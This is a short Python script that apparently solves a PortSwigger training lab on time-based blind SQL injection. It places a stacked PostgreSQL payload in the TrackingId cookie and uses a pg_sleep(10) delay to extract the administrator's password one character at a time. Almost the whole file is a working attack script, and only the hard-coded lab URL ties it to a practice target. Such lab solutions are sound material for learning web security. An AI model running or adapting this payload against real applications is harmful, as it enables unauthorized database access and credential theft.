# This python script can be used to extract information from a database with conditional responses
# Portswigger Lab - https://portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval

import requests
from requests.structures import CaseInsensitiveDict
import string
import time


# Update the URL value as needed
url = "https://0a47009503afa0e282429c53000a00cb.web-security-academy.net/filter?category=Pets"
headers = CaseInsensitiveDict()

leaked_data = list("")

while True:
    for character in string.printable:
        print("Extracted Data:  " + "".join(leaked_data))
        print("Character currently testing:  " + character)

        position = len(leaked_data) + 1

        # The vulnerable parameter to Blind SQL is a cookie value, this is using the f string to update the position and character automatically
        # Update theTrackingId and Session Cookies or SQL payload/query as needed
        headers[
            "Cookie"
        ] = f"TrackingId=N97vB1Bnn7sHgWne'%3b+select+case+when+(substring((select+password+from+users+where+username+='administrator'),{position},1)='{character}')+then+pg_sleep(10)+else+null+end-- ; session=VTTTJU2EpOXpWxBqZ4RcKhjUoxdq6s7V"

        # Time begins now
        start = time.perf_counter()

        # Request is submitted
        resp = requests.get(url, headers=headers)

        # Time ends now
        end = time.perf_counter()

        # Determine the time it took for the response to return
        range = end - start

        # Since the payload included a 10 second time delay, the >8 second range is used to determine if payload was successful
        if range > 8:
            leaked_data.append(character)
            break
